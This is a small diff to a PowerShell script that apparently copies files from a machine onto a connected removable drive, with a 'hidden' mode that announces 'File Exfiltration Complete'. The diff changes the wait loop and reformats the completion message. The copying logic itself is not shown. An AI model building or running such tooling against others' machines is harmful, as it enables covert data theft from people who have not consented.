@@ -21,7 +21,7 @@ $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType
 $count = $removableDrives.count
 $i = 10
 
-While (($count -eq $removableDrives.count) -or ($i -gt 0)){
+While ($true){
     cls
     Write-Host "Connect a Device.. ($i)" -ForegroundColor Yellow
     $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
@@ -82,9 +82,9 @@ foreach ($folder in $foldersToSearch) {
         }
     }
 }
-    If ($hidden -eq 'y'){
-        msg.exe * "File Exfiltration Complete"
-    }
-    else{
-        Write-Host "File Exfiltration Complete" -ForegroundColor Green
-    }
+If ($hidden -eq 'y'){
+    msg.exe * "File Exfiltration Complete"
+}
+else{
+    Write-Host "File Exfiltration Complete" -ForegroundColor Green
+}
